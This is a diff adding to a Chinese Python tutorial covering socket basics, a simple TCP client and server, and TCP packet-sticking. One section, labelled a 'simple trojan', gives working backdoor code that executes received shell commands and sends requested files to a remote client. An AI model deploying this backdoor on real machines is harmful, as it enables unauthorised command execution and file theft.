@@ -567,7 +567,286 @@ pool.close()
 pool.join() # 主进程等待所有子进程执行完毕。必须在close()或terminate()之后。
 ```
 
+## Socket编程基础
 
+### socket 类
+
+Python 提供了两个基本的 socket 模块：
+
+* `socket` 它提供了标准的BSD Socket API。
+* `socketserver` 为服务器端编程提供了进一步封装，可以简化网络服务器的开发。
+
+调用socket.socket可以创建一个Socket实例，socket类构造函数声明如下：
+
+```
+socket(family, type[,protocal])
+```
+
+我们看到socket构造函数接收三个参数
+
+第一个为family。family表示套接字对象使用的地址族，可选值：AF_INET——IPv4地址族，AF_INET6——IPv6地址族，AF_UNIX——针对类UNIX系统的套接字。
+
+第二个为type，可使用的类型如下：
+
+| socket 类型           | 描述                                                         |
+| :-------------------- | :----------------------------------------------------------- |
+| socket.SOCK_STREAM    | 基于TCP的流式socket通信                                      |
+| socket.SOCK_DGRAM     | 基于UDP的数据报式socket通信                                  |
+| socket.SOCK_RAW       | 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次SOCK_RAW也可以处理特殊的IPV4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头 |
+| socket.SOCK_SEQPACKET | 可靠的连续数据包服务                                         |
+
+第三个参数protocal是协议类型，默认是0表示套接字，在套接字编程中不需要关心该参数。
+
+创建TCP Socket的方法如下：
+
+```Python
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+```
+
+创建UDP Socket的方法如下：
+
+```
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+```
+
+接下来我们基于socket类来实现简单的客户端和服务端。
+
+### 客户端编程
+
+新建client.py文件，添加如下代码：
+
+```Python
+# -*- coding: UTF-8 -*-
+
+import socket
+import sys
+
+# 测试类
+class Client:
+    def __init__(self,hostname):
+        self.hostname = hostname # 待连接的远程主机的域名
+    def connet(self): # 连接方法
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except socket.error as e:
+            print("Failed to create socket. Error: %s"%e)
+
+        sys.exit() # 退出进程
+
+if __name__ == '__main__':
+    cl = Client('www.baidu.com')
+    cl.connet()
+```
+
+我们定义一个测试类名为Client，构造函数接收一个域名，用于连接测试。定义了connet方法，创建一个tcp类型的socket实例，向服务端发起连接。该方法最后调用sys.exit()退出。下面我们完善connet方法：
+
+```Python
+ def connet(self): #连接方法
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except socket.error as e:
+            print("Failed to create socket. Error: %s"%e)
+            sys.exit() #退出进程
+        try:
+            remote_ip = socket.gethostbyname(self.hostname)#根据域名获取ip
+        except socket.gaierror:
+            print('主机无法被解析')
+            sys.exit() #退出进程
+        try:
+            s.connect((remote_ip,80))#连接
+            message = b"GET / HTTP/1.1\r\n\r\n"
+            s.sendall(message)#发送数据
+            reply = s.recv(4096)#接收数据
+            print(reply)
+            s.close()#关闭连接
+        except socket.error:
+            sys.exit() #退出进程
+```
+
+现在简单总结下Socket客户端编程的基本步骤：
+
+1. 创建套接字
+
+2. 连接服务端
+
+3. 发送数据
+
+4. 接收数据
+
+5. 关闭连接
+
+### 服务端编程
+
+新建server.py文件，添加如下代码：
+
+```Python
+# -*- coding: UTF-8 -*-
+
+import socket
+import sys
+
+class server:
+    def __init__(self,ip,port):
+        self.port=port
+        self.ip=ip
+    def start(self):
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#创建socket
+        try:
+            s.bind((self.ip,self.port))#绑定
+            s.listen(10)#监听
+            print('等待客户端连接')
+            conn, addr = s.accept()#接收连接
+            print('客户端连接 ' + addr[0] + ':' + str(addr[1]))
+            data = conn.recv(1024)#接收数据
+            print("客户端数据：%s"%data)
+            conn.sendall(bytes("你好客户端\n\r", encoding = "utf8"))#发送数据
+            conn.close()#关闭连接
+           
+        except socket.error as e:
+            print(e)
+            sys.exit()
+        finally:
+             s.close() #关闭服务端
+
+
+if __name__ == '__main__':
+    s = server('',8800)
+    s.start()
+
+```
+
+## 一个简单木马
+
+server
+
+```python
+# -*- coding: UTF-8 -*-
+import socket
+import sys
+import os
+
+class Server:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.buffersize = 10240
+
+    def start(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.bind((self.ip, self.port))
+            s.listen(10)
+            print("waiting for client")
+            while True:
+                try:
+                    conn, addr = s.accept()
+                    print('client connection ' + addr[0] + ":" + str(addr[1]))
+                    while True:
+                        data = conn.recv(self.buffersize)
+                        if not data:
+                            break;
+                        else:
+                            self.executeCommand(conn, data)
+                    conn.close()
+                except socket.error as e:
+                    print(e)
+                    conn.close()
+        finally:
+            s.close()
+
+    def executeCommand(self, tcpCliSock, data):
+        try:
+            message = data.decode("utf-8")
+            if os.path.isfile(message):
+                filesize = str(os.path.getsize(message))
+                print("filesize: " + filesize)
+                tcpCliSock.send(filesize.encode())
+                data = tcpCliSock.recv(self.buffersize)
+                print("start transmit")
+                f = open(message, "rb")
+                for line in f:
+                    tcpCliSock.send(line)
+            else:
+                tcpCliSock.send(("0001" + os.popen(message).read()).encode("utf-8"))
+        except:
+            raise
+
+if __name__ == "__main__":
+    s = Server("", 8800)
+    s.start()
+```
+
+client
+
+```python
+# -*- coding: UTF-8 -*-
+import socket
+import sys
+import re
+import os
+
+class Client:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.buffersize = 10240
+    
+    def connect(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except scoket.error as e:
+            print("Failed to create socket. Error: %s" % e)
+
+        try:
+            s.connect((self.ip, self.port))
+            while True:
+                message = input("> ")
+                if not message:
+                    break
+                s.send(message.encode("utf-8"))
+                data = s.recv(self.buffersize)
+                if not data:
+                    break
+                if re.search("^0001", data.decode("utf-8", "ignore")):
+                    print(data.decode("utf-8")[4:])
+                else:
+                    s.send("File size received".encode("utf-8"))
+                    file_total_size = int(data.decode())
+                    received_size = 0
+                    f = open("new" + os.path.split(message)[-1], "wb")
+
+                    while received_size < file_total_size:
+                        data = s.recv(self.buffersize)
+                        f.write(data)
+                        received_size += len(data)
+                        print("Received:", received_size)
+                    f.close()
+                    print("Recived done", file_total_size, received_size)
+        except socket.error:
+            s.close()
+            raise
+        finally:
+            s.close()
+
+if __name__ == "__main__":
+    c1 = Client("127.0.0.1", 8800)
+    c1.connect()
+    sys.exit()
+```
+
+## 多连接、非阻塞的服务端、客户端编程
+
+**粘包**
+
+```
+什么是粘包？
+
+1.发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小、数据量小的数据包，合并成一个大的数据包发送(把发送端的缓冲区填满一次性发送)。
+
+2接收端底层会把tcp段整理排序交给缓冲区，这样接收端应用程序从缓冲区取数据就只能得到整体数据而不知道怎么拆分
+
+比如发送端发送了一个由2个100字节组成的200字节的数据包到接受端的缓冲区，接受端从缓冲去一次取80字节的数据，那么第一次取的就是一个不完整的数据包，第二次取就会带上第一个数据包的尾部和下一个数据包的头部数据。
+```
 
 
 
